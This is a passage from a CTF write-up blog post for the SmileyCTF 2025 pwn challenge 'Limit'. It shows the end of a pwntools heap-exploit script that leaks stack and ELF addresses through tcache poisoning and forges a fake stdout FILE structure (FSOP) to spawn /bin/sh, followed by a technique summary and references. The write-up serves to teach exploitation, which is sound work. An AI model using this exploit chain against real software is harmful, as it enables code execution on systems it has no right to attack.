</span></span><span class="line"><span class="cl"><span class="n">stack_offset</span> <span class="o">=</span> <span class="mh">0x7ffe1ebbf2a8</span><span class="o">-</span> <span class="mh">0x7ffe1ebbf258</span><span class="o">-</span><span class="mi">8</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;libc_argv = &#34;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_argv</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span><span class="mh">0x28</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write_into</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span><span class="n">pack</span><span class="p">(</span><span class="n">libc_argv</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">view</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Data: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">temp</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">),</span><span class="s1">&#39;all&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">stack_leak</span>  <span class="o">=</span> <span class="n">obfuscate</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span><span class="n">libc_argv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;stack_leak = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">write_into</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span><span class="n">pack</span><span class="p">(</span><span class="n">stack_leak</span><span class="o">-</span><span class="n">stack_offset</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">view</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Data: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">temp</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">),</span><span class="s1">&#39;all&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">.</span><span class="n">address</span>  <span class="o">=</span> <span class="n">obfuscate</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span><span class="n">stack_leak</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x60ea2433c000</span> <span class="o">-</span> <span class="mh">0x60ea2433d160</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;elf.address = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">write_into</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span><span class="n">pack</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">chunks</span><span class="o">+</span><span class="mh">0x10</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write_into</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">pack</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">chunks</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">])</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mi">16</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p16</span><span class="p">(</span><span class="mh">0x1f0</span><span class="p">)</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#######################################################################################3#3</span>
</span></span><span class="line"><span class="cl">                           <span class="c1">######### Performing FSOP ###########</span>
</span></span><span class="line"><span class="cl"><span class="n">stdout_lock</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x250</span>	<span class="c1"># _IO_stdfile_1_lock  (symbol not exported)</span>
</span></span><span class="line"><span class="cl"><span class="n">stdout</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_vtable</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_wfile_jumps&#39;</span><span class="p">]</span><span class="o">-</span><span class="mh">0x18</span>
</span></span><span class="line"><span class="cl"><span class="n">gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x00000000001724f0</span> <span class="c1"># add rdi, 0x10 ; jmp rcx</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">fake</span> <span class="o">=</span> <span class="n">FileStructure</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fake</span><span class="o">.</span><span class="n">flags</span> <span class="o">=</span> <span class="mh">0x3b01010101010101</span>
</span></span><span class="line"><span class="cl"><span class="n">fake</span><span class="o">.</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span>
</span></span><span class="line"><span class="cl"><span class="n">fake</span><span class="o">.</span><span class="n">_IO_save_base</span> <span class="o">=</span> <span class="n">gadget</span>
</span></span><span class="line"><span class="cl"><span class="n">fake</span><span class="o">.</span><span class="n">_IO_write_end</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>	<span class="c1"># will be at rdi+0x10</span>
</span></span><span class="line"><span class="cl"><span class="n">fake</span><span class="o">.</span><span class="n">_lock</span> <span class="o">=</span> <span class="n">stdout_lock</span>
</span></span><span class="line"><span class="cl"><span class="n">fake</span><span class="o">.</span><span class="n">_codecvt</span><span class="o">=</span> <span class="n">stdout</span> <span class="o">+</span> <span class="mh">0xb8</span>
</span></span><span class="line"><span class="cl"><span class="n">fake</span><span class="o">.</span><span class="n">_wide_data</span> <span class="o">=</span> <span class="n">stdout_lock</span><span class="o">+</span><span class="mh">0x18</span>
</span></span><span class="line"><span class="cl"><span class="n">fake</span><span class="o">.</span><span class="n">unknown2</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">fake_vtable</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">fake</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#############################################################################################</span>
</span></span><span class="line"><span class="cl"><span class="n">write_into</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">payload</span><span class="p">[:</span><span class="mh">0x1e0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>For FSOP</code> → <a href="https://pwn.college/software-exploitation/file-struct-exploits/"target="_blank" rel="external nofollow noopener noreferrer">https://pwn.college/software-exploitation/file-struct-exploits/</a>, <a href="https://blog.kylebot.net/2022/10/22/angry-FSROP/"target="_blank" rel="external nofollow noopener noreferrer">https://blog.kylebot.net/2022/10/22/angry-FSROP/</a>, <a href="https://chovid99.github.io/posts/stack-the-flags-ctf-2022/"target="_blank" rel="external nofollow noopener noreferrer">https://chovid99.github.io/posts/stack-the-flags-ctf-2022/</a>.</p>
<hr>
<h2 class="heading-element" id="-summary"><span><strong>.;,;.</strong> Summary</span>
  <a href="#-summary" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>
<p>In this challenge, we tackled a heap-based binary with a <code>chunks</code> table and size tracking. Using <strong>tcache mechanics and view functionality</strong>, we easily leaked <strong>heap</strong> and <strong>libc</strong> addresses.</p>
</li>
<li>
<p>However, a <code>limit</code> pointer blocked writes to memory above a certain point.</p>
</li>
<li>
<p>While reading data into a chunk, we identified a <strong>null byte poisoning</strong> bug, <strong>which we used</strong> to create <strong>overlapping chunks</strong>, enabling a <strong>Use-After-Free (UAF)</strong> primitive.</p>
</li>
<li>
<p>We then exploited <strong>tcache bin behavior</strong>, especially how malloc updates the bin head using the chunk&rsquo;s <code>fd</code> pointer. This allowed us to <strong>indirectly leak a stack address</strong> from libc’s <code>.data</code> section. By reversing the pointer obfuscation, we recovered a valid stack pointer and used it to leak an <strong>ELF address</strong>.</p>
</li>
<li>
<p>With <strong>arbitrary read/write</strong>, and full leaks of <strong>heap, libc, stack, and ELF</strong>, we weaponized <strong>FSOP (File Stream Oriented Programming)</strong> by crafting a fake <code>stdout</code> structure and triggering code execution via <code>puts()</code>.</p>
</li>
</ul>
<p><img loading="lazy" src='http://localhost:1313/d1ff/images_limit/b1c8c5c0-5933-4591-bffe-15c5aabdb983.png' alt="flag2.png"></p>
<hr>
<h2 class="heading-element" id="resources-and-references"><span>Resources and References</span>
  <a href="#resources-and-references" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>😊<code>smiley’s</code> → <a href="https://play.ctf.gg/"target="_blank" rel="external nofollow noopener noreferrer">https://play.ctf.gg/</a>, <a href="https://ctf.gg/"target="_blank" rel="external nofollow noopener noreferrer">https://ctf.gg/</a></p>
<ul>
<li><code>challenge files</code> → <a href="https://github.com/sajjadium/ctf-archives/tree/main/ctfs/smileyCTF/2025"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/sajjadium/ctf-archives/tree/main/ctfs/smileyCTF/2025</a></li>
<li><code>Safe-linking</code> → <a href="https://ir0nstone.gitbook.io/notes/binexp/heap/safe-linking"target="_blank" rel="external nofollow noopener noreferrer">https://ir0nstone.gitbook.io/notes/binexp/heap/safe-linking</a></li>
<li><a href="https://azeria-labs.com/"target="_blank" rel="external nofollow noopener noreferrer">https://azeria-labs.com/</a></li>
<li><a href="https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md</a></li>
<li><a href="https://github.com/shellphish/how2heap"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/shellphish/how2heap</a></li>
<li><a href="https://blog.quarkslab.com/heap-exploitation-glibc-internals-and-nifty-tricks.html"target="_blank" rel="external nofollow noopener noreferrer">https://blog.quarkslab.com/heap-exploitation-glibc-internals-and-nifty-tricks.html</a></li>
<li><a href="https://pwn.college/"target="_blank" rel="external nofollow noopener noreferrer">https://pwn.college/</a></li>
<li><a href="https://phrack.org/issues/66/10"target="_blank" rel="external nofollow noopener noreferrer">https://phrack.org/issues/66/10</a></li>
<li><a href="https://7rocky.github.io/en/ctf/htb-challenges/pwn/bon-nie-appetit/"target="_blank" rel="external nofollow noopener noreferrer">https://7rocky.github.io/en/ctf/htb-challenges/pwn/bon-nie-appetit/</a> ( <code>similar writeup</code> )</li>
<li><a href="https://hackmd.io/@5Mo2wp7RQdCOYcqKeHl2mw/ByTHN47jf"target="_blank" rel="external nofollow noopener noreferrer">https://hackmd.io/@5Mo2wp7RQdCOYcqKeHl2mw/ByTHN47jf</a></li>
</ul>
</div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2025-06-28 03:21:46">Updated on 2025-06-28&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="http://localhost:1313/d1ff/posts/smiley_writeup/limit/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span><span><a href="vscode://file/C:%5cUsers%5citisa%5cmy-git%5cd1ff%5ccontent%5cposts%5csmiley_writeup%5climit.md" title="Open in editor"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Open in editor</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="http://localhost:1313/d1ff/posts/smiley_writeup/limit/" data-title="SmileyCTF 2025 Writeup (Pwn/Limit)" data-via="Anuj1337" data-hashtags="Heap Exploitation,tcache,null-byte-poisoning,FSOP"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/d1ff/posts/smiley_writeup/limit/" data-hashtag="Heap Exploitation"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/d1ff/posts/smiley_writeup/limit/" data-title="SmileyCTF 2025 Writeup (Pwn/Limit)"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="http://localhost:1313/d1ff/tags/heap-exploitation/" class="post-tag" title="Tags - Heap Exploitation">Heap Exploitation</a><a href="http://localhost:1313/d1ff/tags/tcache/" class="post-tag" title="Tags - Tcache">Tcache</a><a href="http://localhost:1313/d1ff/tags/null-byte-poisoning/" class="post-tag" title="Tags - Null-Byte-Poisoning">Null-Byte-Poisoning</a><a href="http://localhost:1313/d1ff/tags/fsop/" class="post-tag" title="Tags - FSOP">FSOP</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="http://localhost:1313/d1ff/">Home</a></span>
    </section>
  </div><div class="post-nav"><a href="http://localhost:1313/d1ff/posts/squirrel_writeup/logon/" class="post-nav-item" rel="prev" title="Squ1rrelCTF 2025 Writeup (Pwn/Squ1rrel_logon)"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Squ1rrelCTF 2025 Writeup (Pwn/Squ1rrel_logon)</a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--progress-h: 3px;--bg-progress: #FFA500;--bg-progress-dark: #00FFFF;"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="http://localhost:1313/d1ff/lib/cookieconsent/cookieconsent.min.css"><script src="http://localhost:1313/d1ff/lib/sharer/sharer.min.js" async defer></script><script src="http://localhost:1313/d1ff/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"version":"v0.3.21-b2e6f70a"};console.log('Page config:', window.config);</script><script src="http://localhost:1313/d1ff/js/theme.min.js" defer></script></body>
</html>
